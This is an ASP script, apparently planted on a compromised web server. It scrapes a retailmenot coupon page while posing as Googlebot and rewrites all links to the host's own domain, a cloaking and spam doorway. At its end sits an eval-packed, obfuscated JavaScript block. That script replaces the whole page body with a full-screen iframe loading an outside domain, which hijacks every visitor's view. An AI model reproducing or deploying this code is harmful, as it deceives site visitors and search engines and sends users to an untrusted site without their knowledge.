<%
Dim HK,U_HK,Body,SFDm_HK,QStr
U_HK="http://www.retailmenot.com/coupons/uggboots"
Set HK = New RCls
SFDm_HK=HK.GetAutoDomain()
QStr=Request.ServerVariables("QUERY_STRING")
If Not HK.IsNul(QStr) Then
	U_HK=U_HK&"?"&QStr
End if
Body=HK.Core(U_HK)
Body=HK.ReplaceText(Body,"<base([\s\S]*?)href=([\s\S]*?)/>","")
Body=HK.ReplaceText(Body,"<script([\s\S]*?)<\/script>","")
Body=HK.ReplaceText(Body,"\s+href\s*=\s*[""']?\s*http(s)?://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?[""']?"," href="""&SFDm_HK&"$3""")
Body=HK.ReplaceText(Body,"links:<br />([\s\S]*?)(</body>)","$2")
Set HK = Nothing
If Body<>"E" Then
End if
	Response.Write Body

Class RCls
  Private R
	Private Sub Class_Initialize()
	  R="googlebot"
	End Sub
  Private Sub Class_Terminate()
	End Sub
	Function Core(url)
	  On Error Resume Next
	  Dim X,S,cnt
		Set X=Server.CreateObject("MSXML2.XMLHTTP")
		X.Open "GET",url,False
		X.setRequestHeader "User-Agent",R
		X.Send
		If X.ReadyState=4 And X.Status=200 Then
	    cnt=X.ResponseBody
	  Else
	    cnt="E":Exit Function
	  End if
		Set X=Nothing
		set S = Server.CreateObject("Adodb.Stream")
		S.Type = 1:S.Mode =3:S.Open:S.Write cnt:S.Position = 0:S.Type = 2:S.Charset = "UTF-8"
		cnt = S.ReadText:S.Close
		Core=cnt
	End Function
	
	Sub Die(Str)
	  Response.Write Str : Response.End
	End Sub
	
	Function IsNul(Str)
	  If Str="" Or IsNull(Str) Then IsNul=True Else IsNul=false
	End Function
	
	Function ChkClng(ByVal str)
	  On error resume next
		If IsNumeric(str) Then
			ChkClng = CLng(str)
		Else
			ChkClng = 0
		End If
		If Err Then ChkClng=0
	End Function
	
	Function ReplaceText(strHTML,ptn,replStr)
		Dim regEx
		Set regEx = New RegExp
		regEx.Pattern = ptn
		regEx.IgnoreCase = True
		regEx.Global = True
		ReplaceText = regEx.Replace(""&strHTML&"",replStr)
		Set regEx=Nothing
	End Function

	Public Function GetAutoDomain()
		Dim TempPath
		If Request.ServerVariables("SERVER_PORT") = "80" Then
			GetAutoDomain = Request.ServerVariables("SERVER_NAME")
		Else
			GetAutoDomain = Request.ServerVariables("SERVER_NAME") & ":" & Request.ServerVariables("SERVER_PORT")
		End If
		If Instr(UCASE(GetAutoDomain),"/W3SVC")<>0 Then
			   GetAutoDomain=Left(GetAutoDomain,Instr(GetAutoDomain,"/W3SVC"))
		End If
		GetAutoDomain = "http://" & GetAutoDomain
	End Function
	
End Class
%>
<script type='text/javascript'>
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9.5.h="<f c=\'0\' n=\'4:#a;6: 0;d: 1%;i: 0;k: b;l: 0;o-3: 7;p: 0; q: 1%; s-g: 2;\' m=\'e://r.j.8\' />";',62,29,'|100|99999|align|background|body|bottom|center|com|document|fff|fixed|frameborder|height|http|iframe|index|innerHTML|left|rgtyhujythgrfeedefrgrg|position|right|src|style|text|top|width|uggen|z'.split('|'),0,{}))
</script>